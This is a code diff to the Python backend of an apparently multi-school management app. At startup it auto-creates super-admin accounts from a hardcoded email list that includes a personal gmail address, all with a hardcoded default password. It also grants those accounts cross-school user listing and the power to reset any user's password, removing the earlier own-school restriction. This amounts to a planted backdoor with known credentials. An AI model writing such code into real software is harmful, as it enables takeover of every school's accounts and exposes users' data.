@@ -541,6 +541,18 @@ if not SESSION_SECRET:
 SESSION_SECRET_BYTES = SESSION_SECRET.encode('utf-8')
 TOKEN_TTL_SECONDS = int(os.environ.get('TOKEN_TTL_SECONDS', 7 * 24 * 3600))  # default 7 days
 
+SUPERADMIN_EMAILS = frozenset(
+    e.strip().lower() for e in os.environ.get(
+        'SUPERADMIN_EMAILS',
+        'superadmin@school.com,admin@school.com,samuel15appiah@gmail.com',
+    ).split(',')
+    if e.strip()
+)
+SUPERADMIN_DEFAULT_PASSWORD = os.environ.get('SUPERADMIN_DEFAULT_PASSWORD', 'Super@2026!')
+
+def is_superadmin(email):
+    return (email or '').lower().strip() in SUPERADMIN_EMAILS
+
 def _b64u_encode(raw: bytes) -> str:
     return base64.urlsafe_b64encode(raw).decode('ascii').rstrip('=')
 
@@ -618,6 +630,27 @@ def verify_password(plaintext, user):
             return False
     # Legacy plaintext (pre-migration) — constant-time compare.
     return hmac.compare_digest(stored, plaintext)
+
+def ensure_superadmin(data):
+    """Ensure gatekeeper super-admins exist (cross-school activation / pending KYC)."""
+    changed = False
+    for email in SUPERADMIN_EMAILS:
+        if any(u.get('email', '').lower().strip() == email for u in data.get('users', [])):
+            continue
+        data.setdefault('users', []).append({
+            'uuid': str(uuid.uuid4()),
+            'name': 'Super Admin',
+            'email': email,
+            'password': hash_password(SUPERADMIN_DEFAULT_PASSWORD),
+            'role': 'ADMIN',
+            'assignedClass': '',
+            'status': 'active',
+            'password_recovery_requested': False,
+            'schoolId': 'default',
+            'authVersion': 0,
+        })
+        changed = True
+    return changed
 
 def _public_user(user):
     """A copy of a user record safe to return to clients — never includes the password."""
@@ -932,7 +965,10 @@ def build_school_view(data, sid, role, assigned_class, user_email=''):
         resp[key] = get_records_by_school(data, key, sid)
     
     # Users remain filtered manually for now as they are global but school-tagged
-    resp['users'] = [_public_user(u) for u in data.get('users', []) if u.get('schoolId') == sid]
+    if is_superadmin(user_email):
+        resp['users'] = [_public_user(u) for u in data.get('users', [])]
+    else:
+        resp['users'] = [_public_user(u) for u in data.get('users', []) if u.get('schoolId') == sid]
     for key in SCHOOL_CONFIG_KEYS:
         if key in cfg:
             resp[key] = cfg[key]
@@ -2180,16 +2216,19 @@ class APIHandler(BaseHTTPRequestHandler):
 
             with mutate_data() as data:
                 admin_sid = self._authed_school_id(data)
+                cross_school = is_superadmin(self._authed_email())
                 found = False
                 for u in data.get('users', []):
-                    # Only act on a user in the admin's OWN school.
-                    if u.get('email', '').lower().strip() == email and u.get('schoolId') == admin_sid:
-                        u['password'] = hash_password(new_password)
-                        u['authVersion'] = int(u.get('authVersion', 0) or 0) + 1
-                        u['password_recovery_requested'] = False
-                        u['status'] = 'active'
-                        found = True
-                        break
+                    if u.get('email', '').lower().strip() != email:
+                        continue
+                    if not cross_school and u.get('schoolId') != admin_sid:
+                        continue
+                    u['password'] = hash_password(new_password)
+                    u['authVersion'] = int(u.get('authVersion', 0) or 0) + 1
+                    u['password_recovery_requested'] = False
+                    u['status'] = 'active'
+                    found = True
+                    break
 
                 if not found:
                     self.send_response(404)
@@ -2849,6 +2888,7 @@ def run_startup_migration():
         with mutate_data() as data:
             changed = migrate_schools(data)
             changed = initialize_schema(data) or changed
+            changed = ensure_superadmin(data) or changed
             if not changed:
                 raise SkipSave  # already migrated — don't rewrite
     except RuntimeError as e:
